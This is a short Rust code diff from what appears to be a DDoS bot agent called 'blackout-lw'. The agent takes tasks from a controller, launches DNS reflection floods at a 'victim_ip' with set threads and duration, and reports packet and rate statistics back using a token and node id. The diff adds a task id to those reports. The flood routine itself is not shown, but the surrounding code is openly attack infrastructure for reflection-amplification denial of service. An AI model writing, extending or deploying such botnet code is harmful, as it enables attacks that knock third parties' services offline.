@@ -92,7 +92,7 @@ pub fn run(cfg: &Config) -> Result<(), HError> {
 
         // 统计上报（3s 周期合并到下一次心跳前）
         if last_report.elapsed() >= Duration::from_secs(3) {
-            let _ = report(cfg, &node_id, &stats);
+            let _ = report(cfg, &node_id, "", &stats);
             last_report = std::time::Instant::now();
         }
 
@@ -159,16 +159,17 @@ fn run_task(cfg: &Config, node_id: &str, task: &TaskMsg, stats: &std::sync::Arc<
         task.task_id, task.target, fmt_ip(victim_ip), spec.threads, spec.duration_secs
     );
     run_dns_reflection(&spec, std::sync::Arc::clone(stats));
-    report(cfg, node_id, stats)?;
+    report(cfg, node_id, &task.task_id, stats)?;
     eprintln!("blackout-lw: task {} done (pkts={})", task.task_id, stats.packets());
     Ok(())
 }
 
-fn report(cfg: &Config, node_id: &str, stats: &Stats) -> Result<(), HError> {
+fn report(cfg: &Config, node_id: &str, task_id: &str, stats: &Stats) -> Result<(), HError> {
     let body = format!(
-        r#"{{"token":"{}","node_id":"{}","packets":{},"bytes":{},"errors":{},"pps":{}}}"#,
+        r#"{{"token":"{}","node_id":"{}","task_id":"{}","packets":{},"bytes":{},"errors":{},"pps":{}}}"#,
         cfg.token,
         node_id,
+        task_id,
         stats.packets(),
         stats.bytes(),
         stats.errors(),
